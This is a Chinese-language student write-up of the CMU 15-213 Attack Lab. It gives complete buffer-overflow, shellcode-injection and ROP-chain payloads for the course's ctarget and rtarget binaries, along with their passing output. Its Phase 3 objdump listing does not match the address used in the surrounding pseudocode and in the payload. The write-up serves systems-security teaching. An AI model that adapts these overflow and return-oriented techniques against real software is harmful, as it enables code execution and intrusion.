# Attack Lab - JettyCoffee
## 实验要求
实验主要操作三个文件：  
`ctarget`：用于代码注入攻击  
`rtarget`：用于rope攻击  
`hex2raw`：将16进制的书数据转化为对应的ascii码字符
## 答案与成功的截图以拷贝文本，粘贴进Markdown的形式展现。
## Phase1 - CTarget
> 在第一个实验中，你不需要注入新的汇编代码，你只需要通过输入字符串，使得ctarget程序去执行已经存在的函数touch1函数。
> ctarget的函数调用链：main() -> test() -> getbuf() -> Gets()
> 字符串通过Gets()函数进行读取。

解决办法：
首先观察`getbuf`函数：可以看出`BUFFER_SIZE`的大小是`40`字节（`0x28`）

```0
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp  # rsp = 0x5561dca0 #for string = 0x5561dc78
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
那么主要的思路便是找到touch1函数的起始地址，然后在getbuf执行完ret后跳转到touch1  
而touch1函数的起始位置是`0x4017c0`  
那么需要注入的字符串为：

```j0
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
c0 17 40 00 00 00 00 00  // touch1 address: 0x4017c0
```
将字符串保存为touch1.txt，并执行`./hex2raw < touch1.txt | ./ctarget -q`
得到返回结果
```0
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00
```
## Phase2 - CTarget
> 第二题的需求与第一题相似，区别在于需要在注入的字符串中加入代码  

首先先观察touch2的函数部分：

```0
void touch2(unsigned val){  
  vlevel = 2; /* Part of validation protocol */ 
  if (val == cookie) {
   printf("Touch2!: You called touch2(0x%.8x)\n", val);
   validate(2);
   } else {
   printf("Misfire: You called touch2(0x%.8x)\n", val);
   fail(2);
   }
  exit(0);
 }
```
这表明touch2需要我们多输入一个val参数（相较于touch1），使得ctarget执行完getbuf后执行touch2函数  
查看touch2的源码：

```0
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # cookie地址：6044e4 <cookie> cookie存储在%edi中
  401802:	75 20                	jne    401824 <touch2+0x38>       # cookie = 0x59b997fa
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	call   401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	call   401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	call   400e40 <exit@plt>
```
可以发现cookie的值在程序运行时是存放在内存地址为:0x6044e4中。 在gdb中进行调试，可以查看到地址:0x6044e4的内容：
```0
(gdb) b *test
 Breakpoint 1 at 0x401968: file visible.c, line 90.
(gdb) x /4x 0x6044e4
0x6044e4 <cookie>:      0x59b997fa      0x00000000      0x00000000      0x00000000
```
从中可以看到：touch2函数中需要对比的cookie值是0x59b997fa
想要实现从getbuf结束之后，跳转到touch2，只需要两个步骤：

> 将cookie的值放在%rdi寄存器中。  
> 设置下一条指令的地址为touch2函数 （touch2的地址0x4017ec）

汇编伪代码:
```0
movq $0x59b997fa , %rdi # 把val的值放入%rdi内
pushq $0x4017ec # 将touch2的地址压入栈
retq
```
输入命令：gcc -c touch2.s生成机器码文件touch2.o   
输入命令：objdump -d touch2.o > touch2.txt进行反汇编。

```0
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```
现在只需要找到getbuf()栈中用于字符串的首地址就好了：  
在getbuf的汇编代码最后一行:retq 处打断点
```0
(gdb) b *getbuf+21
Breakpoint 1 at 0x4017bd: file buf.c, line 16.
(gdb) p $rsp
$1 = (void *) 0x5561dca0
# 查看一下 栈中存放字符串的首地址
(gdb) p $rsp-0x28
$2 = (void *) 0x5561dc78
```
那么phase2的注入代码就应为：

```0
48 c7 c7 fa 97 b9 59 # movq $0x59b997fa , %rdi
68 ec 17 40 00 # pushq $0x4017ec
c3 # ret
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00 # 栈的首地址
```
将字符串保存为touch2.txt，并执行`./hex2raw < touch2.txt | ./ctarget -q`
得到返回结果

```0
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 
```
## Phase3 - CTarget
> 第3个实验同样是使用字符串作为参数，进行代码注入攻击。

在ctarget文件中的hexmatch函数和touch3函数如下所示：

```0
/* Compare string to hex represention of unsigned value */ 
int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}


void touch3(char *sval){
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
			printf("Touch3!: You called touch3(\"%s\")\n", sval);
			validate(3);
	} else {
			printf("Misfire: You called touch3(\"%s\")\n", sval);
			fail(3);
	}
	exit(0);
}
```
可以看到，我们需要给出sval以cookie的地址为值。而比较棘手的地方是在于：hexmatch()函数。
> hexmatch函数会将val对应的8位16进制数据转化为字符串存放在cbuf中，但是存放在cbuf中具体的起始位置是随机生成的。  
> sval也是指向在栈中的地址，所以需要保证sval指向栈中的地址和s指向栈中的地址不能冲突，不然数据会被覆盖掉。  
> 字符串cookie应该用字节表示，输入命令man ascii查看所需字符的字节表示，0x59b997fa对应16进制为：35 39 62 39 39 37 66 61。

因为在touch3和hexmatch中会push数据进入堆栈，所以需要注意cookie字符串的存放位置，因为覆盖了保存getbuf使用的缓冲区的内存部分，所以可以不考虑把cookie字符串放到40个字符的堆栈里面，40个字符用来存放命令后填满即可。

所以cookie字符串可以考虑放到get的栈帧中，即越过40个字符的上方，因为不再返回了，所以那部分就不会被触碰到

将cookie字符串存放在栈顶+8字节的位置（即cookie字符串的起始地址），再把这个cookie字符串的起始地址存放进%rdi中。

在Phase2中已经得到栈顶指针%rsp的初始值为0x5561dca0，所以cookie字符串的起始地址为0x5561dca0；并查看，touch3函数的地址为0x4018fa。  
于是构建伪代码

```0
movq $0x5561dca8 , %rdi #set cookie's address to %rdi which is sval
（这其实表面*sval = cookie）
pushq $0x4018fa #push touch3's address to stack
retq #return to touch3
```
输入命令：gcc -c touch3.s生成机器码文件touch3.o   
输入命令：objdump -d touch3.o > touch3.txt进行反汇编。

```0
0000000000000000 <.text>:
   0:   48 c7 c7 a0 dc 61 55    mov    $0x5561dca0,%rdi
   7:   68 fa 18 40 00          push   $0x4018fa
   c:   c3                      ret
```
由Phase2也可以得到getbuf注入的字符串起始位置是0x5561dc78

因此phase3的注入代码就应为：

```0
48 c7 c7 a8 dc 61 55 
68 fa 18 40 00 
c3
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```
将字符串保存为touch3.txt，并执行`./hex2raw < touch3.txt | ./ctarget -q`
得到返回结果

```0
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```
## Phase4 - RTarget
> 不同于ctarget只需要注入代码于栈中，rtarget因为栈的初始位置随机，且在栈内运行代码时会报Segmentation Fault，因此无法采用简单注入代码的方式。

首先先观察touch2的函数部分：

```0
void touch2(unsigned val){  
  vlevel = 2; /* Part of validation protocol */ 
  if (val == cookie) {
   printf("Touch2!: You called touch2(0x%.8x)\n", val);
   validate(2);
   } else {
   printf("Misfire: You called touch2(0x%.8x)\n", val);
   fail(2);
   }
  exit(0);
 }
```
函数要实现一个val == cookie，传入val的方式也很简单：
```0
popq %rax # 将栈顶内容移入rax寄存器
movq %rax, %rdi # 数据放入rdi寄存器作为val
```
查询实验文档发现对应的指令为：
```0
popq %rax # 58
movq %rax, %rdi # 48 89 c7
```
在rtarget的start_farm至mid_farm中可以找到：

```0
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret
```
那么自然可以得到输入字符串为：

```0
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30 # getbuf栈的40字节
cc 19 40 00 00 00 00 00 # 0x4019ca + 0x2
fa 97 b9 59 00 00 00 00 # cookie的值
c5 19 40 00 00 00 00 00 # 0x4019c3 + 0x2
ec 17 40 00 00 00 00 00 # touch2起始位置
```
保存为rtouch2.txt，并执行`./hex2raw < rtouch2.txt | ./rtarget -q`
得到返回结果
```0
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```
## Phase5 - RTarget
其实在ctarget里面把cookie的地址放在test栈内时，第五题的难点就在于如何找到cookie的地址，因为%rsp的位置并非确定而是随机值。  
最开始的想法是将%rsp保存在%rax内，然后add一个偏移量即可找到cookie地址，但farm内并无add语句的办法，于是需要找另一种办法——lea。

```0
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret
```
那么可以先把%rsp保存在%rdi，将偏移量保存在%rsi，执行0x4019d6就能得到cookie地址。  
同时因为没有%rax到%rsi的实现方法，因此只能通过%eax -> %edx -> %ecx -> %esi   
因此就有以下的汇编代码：
```0
popq %rax # 58
movl %eax, %edx   # 89 c2
movl %edx, %ecx   # 89 d1
movl %ecx, %esi   # 89 ce
```
cookie的偏移量为72字节（0x48）

通过查找farm可以得到最终的字符串为：

```0
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # getbuf栈的40字节
ad 1a 40 00 00 00 00 00 # movq %rsp, %rax # 0x401aab + 0x2
c5 19 40 00 00 00 00 00 # movq %rax, %rdi # 0x4019c3 + 0x2
cc 19 40 00 00 00 00 00 # popq %rax       # 0x4019ca + 0x2
48 00 00 00 00 00 00 00 # cookie的偏移量0x48
20 1a 40 00 00 00 00 00 # movl %eax, %edx # 0x401a1e + 0x2
34 1a 40 00 00 00 00 00 # movl %edx, %ecx # 0x401a33 + 0x1
27 1a 40 00 00 00 00 00 # movl %ecx, %esi # 0x401a25 + 0x2
d6 19 40 00 00 00 00 00 # lea    (%rdi,%rsi,1),%rax
c5 19 40 00 00 00 00 00 # movq %rax, %rdi # 0x4019c3 + 0x2
fa 18 40 00 00 00 00 00 # touch3的起始位置
35 39 62 39 39 37 66 61 # cookie的assci码表示
```
保存为rtouch3.txt，并执行`./hex2raw < rtouch3.txt | ./rtarget -q`
得到返回结果
```0
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 20 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```
实验五需要注意的是在选择farm的区间时，需要避免指令产生干扰

类似于

```0
0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	ret
```
中的48 89 e0后的c7就会产生干扰，应选择实验文档figure3的不会产生干扰的代码